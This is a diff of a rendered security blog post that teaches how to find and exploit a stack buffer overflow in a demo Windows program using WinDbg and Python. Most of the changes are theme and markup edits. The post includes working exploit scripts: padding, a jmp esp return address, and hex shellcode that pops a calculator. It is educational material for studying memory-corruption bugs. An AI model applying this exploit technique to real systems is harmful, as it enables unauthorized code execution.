@@ -1,50 +1,110 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  	<meta charset="utf-8">
-  	<title>Dimitri Fourny | How to detect and exploit a buffer overflow</title>
-  	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-  	<meta name="description" content="Passionate security researcher.">
-  	<meta name="author" content="Dimitri Fourny">
-	
-	<link href="/assets/css/bootstrap.min.css" rel="stylesheet">
-    <link href="/assets/css/style.css" rel="stylesheet">
-  	<link href="/assets/css/syntax.css" rel="stylesheet">
+<!--
+    So Simple Jekyll Theme 3.2.0
+    Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+    Free for personal and commercial use under the MIT license
+    https://github.com/mmistakes/so-simple-theme/blob/master/LICENSE
+-->
+<html lang="en-US" class="no-js">
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  
 
-    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
-    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  	<link rel="shortcut icon" href="/assets/img/favicon.png">
+  
+    <title>How to detect and exploit a buffer overflow</title>
+    <meta name="description" content="The buffer overflow is the most classical vulnerability, on Linux and on Windows. In this article, I will try to show you how to exploit a buffer overflow on...">
+    <link rel="canonical" href="https://dimitrifourny.github.io//2014/02/06/buffer-overflow.html">
+  
+
+  <script>
+    /* Cut the mustard */
+    if ( 'querySelector' in document && 'addEventListener' in window ) {
+      document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + 'js';
+    }
+  </script>
+
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/skins/default.css">
+  <!-- start custom head snippets -->
+
+<!-- insert favicons. use http://realfavicongenerator.net/ -->
+<link rel="shortcut icon" href="/assets/img/favicon.png">
+
+<!-- end custom head snippets -->
+
 </head>
 
-<body>
-	<div class="navbar navbar-default navbar-static-top" role="navigation">
-		<div class="container">
-			<div class="navbar-header">
-				<a class="navbar-brand" href="/">Dimitri Fourny</a>
-	          	<button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main">
-	            	<span class="icon-bar"></span>
-	            	<span class="icon-bar"></span>
-	            	<span class="icon-bar"></span>
-	          	</button>
-		    </div>
 
-		    <div class="navbar-collapse collapse" id="navbar-main">
-		      <ul class="nav navbar-nav navbar-right">
-            <li ><a href="/about.html">About</a></li>
-		        <li><a href="https://twitter.com/DimitriFourny">Twitter</a></li>
-            <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
-		        <li><a href="http://fr.linkedin.com/pub/dimitri-fourny/58/283/13a/">Linkedin</a></li>
-		      </ul>
-		    </div>
-		</div>
+  <body class="layout--post  how-to-detect-and-exploit-a-buffer-overflow">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#primary-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+  <div class="navigation-wrapper">
+    <a href="#menu-toggle" id="menu-toggle">Menu</a>
+    <nav id="primary-nav" class="site-nav animated drop">
+      <ul><li><a href="/">Home</a></li><li><a href="/about">About</a></li><li><a href="https://twitter.com/DimitriFourny">Twitter</a></li><li><a href="https://github.com/DimitriFourny">Github</a></li><li><a href="http://fr.linkedin.com/pub/dimitri-fourny/">Linkedin</a></li></ul>
+    </nav>
+  </div><!-- /.navigation-wrapper -->
+
+
+    <header class="masthead">
+  <div class="wrap">
+    
+    
+    
+      
+        <div class="site-title animated fadeIn"><a href="/">Dimitri Fourny</a></div>
+      
+      <p class="site-description animated fadeIn" itemprop="description">Personal website and computer security blog.</p>
+    
   </div>
+</header><!-- /.masthead -->
 
-	<div class="container">
-		
-		<div class="row">
-			<div class="col-sm-12">
-        <h1>How to detect and exploit a buffer overflow </h1>
-        <p>The buffer overflow is the most classical vulnerability, on Linux and on Windows.
+
+    <main id="main" class="main-content" aria-label="Content">
+  <article class="h-entry">
+    
+
+    <div class="page-wrapper">
+      <header class="page-header">
+        
+        
+          <h1 id="page-title" class="page-title p-name">How to detect and exploit a buffer overflow
+</h1>
+        
+      </header>
+
+      <div class="page-sidebar">
+        <div class="page-author h-card p-author"><img src="http://twivatar.glitch.me/dimitrifourny" class="author-avatar u-photo" alt="Dimitri Fourny"><div class="author-info"><div class="author-name">
+        <span class="p-name">Dimitri Fourny</span>
+      </div><ul class="author-links"><li class="author-link">
+            <a class="u-url" rel="me" href="https://twitter.com/dimitrifourny"><i class="fab fa-twitter-square fa-lg" title="Twitter"></i></a>
+          </li></ul>
+    <time class="page-date dt-published" datetime="2014-02-06T00:00:00+01:00"><a class="u-url" href="">February 6, 2014</a>
+</time>
+
+  </div>
+</div>
+
+        
+
+        
+
+      </div>
+
+      <div class="page-content">
+        <div class="e-content">
+          <p>The buffer overflow is the most classical vulnerability, on Linux and on Windows.
 In this article, I will try to show you how to exploit a buffer overflow on 
 Windows with WinDbg and a little Python code.</p>
 
@@ -81,7 +141,7 @@ protections. Open <em>Project -&gt; Properties</em> and set:</p>
 <p>We will test <code class="highlighter-rouge">argv[1]</code> entry:</p>
 
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span> 
-<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span><span class="s">'A'</span><span class="o">*</span><span class="mi">200</span><span class="p">);</span>
+<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span><span class="s">'A'</span><span class="o">*</span><span class="mi">200</span><span class="p">);</span>
 </code></pre></div></div>
 
 <p>We start our Python script, WinDbg and we do File -&gt; Attach to a Process. 
@@ -122,7 +182,7 @@ our shellcode. We look at the stack to know how many ‘A’ we need to remove:<
 Evaluate expression: 92 = 0000005c
 </code></pre></div></div>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span> 
-<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span><span class="s">'A'</span><span class="o">*</span><span class="mi">104</span><span class="o">+</span><span class="s">'B'</span><span class="o">*</span><span class="mi">4</span><span class="p">);</span>
+<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span><span class="s">'A'</span><span class="o">*</span><span class="mi">104</span><span class="o">+</span><span class="s">'B'</span><span class="o">*</span><span class="mi">4</span><span class="p">);</span>
 </code></pre></div></div>
 
 <p>And execute it:</p>
@@ -142,7 +202,7 @@ In fact, if we want to do that:</p>
 <span class="n">padding</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="mi">104</span> <span class="c1"># NOP
 </span><span class="n">eip</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x4c\xff\x18\x00</span><span class="s">'</span> <span class="c1"># 0018ff4c
 </span>
-<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">eip</span><span class="p">);</span>
+<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">eip</span><span class="p">);</span>
 </code></pre></div></div>
 
 <p>We see that EIP wil contain a null byte and the shellcode will not work. So we 
@@ -209,7 +269,7 @@ Found 14 usable addresses
 </span><span class="n">jmpESP</span> <span class="o">=</span> <span class="s">'</span><span class="se">\xA9\x2E\xC3\x75</span><span class="s">'</span> <span class="c1"># *75C32EA9 = jmp esp
 </span><span class="n">shellcode</span> <span class="o">=</span> <span class="s">'</span><span class="se">\xCC</span><span class="s">'</span><span class="o">*</span><span class="mi">4</span>        <span class="c1"># INT 3
 </span>
-<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">jmpESP</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">);</span>
+<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">jmpESP</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">);</span>
 </code></pre></div></div>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:001&gt; g
@@ -244,13 +304,51 @@ pop a calc:</p>
 			<span class="s">"</span><span class="se">\xB7\x2C\x51\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF1\x8B\x74</span><span class="s">"</span>
 			<span class="s">"</span><span class="se">\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7\xCC</span><span class="s">"</span><span class="p">);</span>
 
-<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">jmpESP</span> <span class="o">+</span><span class="s">'"'</span><span class="o">+</span><span class="n">shellcode</span><span class="o">+</span><span class="s">'"'</span><span class="p">);</span>
+<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">jmpESP</span> <span class="o">+</span><span class="s">'"'</span><span class="o">+</span><span class="n">shellcode</span><span class="o">+</span><span class="s">'"'</span><span class="p">);</span>
 </code></pre></div></div>
 
-			</div>
-		</div>
+        </div>
 
+        
+
+        
+
+        <nav class="page-pagination" role="navigation">
+  
+
+  
+    <a class="page-next" href="/2014/02/26/kernel-buffer-overflow.html">
+      <h4 class="page-pagination-label">Next</h4>
+      <span class="page-pagination-title">
+        Kernel buffer overflow on Windows
+ <i class="fas fa-arrow-right"></i>
+      </span>
+    </a>
+  
+</nav>
+
+      </div>
     </div>
+  </article>
+</main>
 
-</body>
+
+    <footer id="footer" class="site-footer">
+  <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+<div class="copyright">
+    
+      <p>&copy; 2020 Dimitri Fourny. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://github.com/mmistakes/so-simple-theme" rel="nofollow">So Simple</a>.</p>
+    
+  </div>
+</footer>
+
+    <script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script>
+
+
+  </body>
+
 </html>
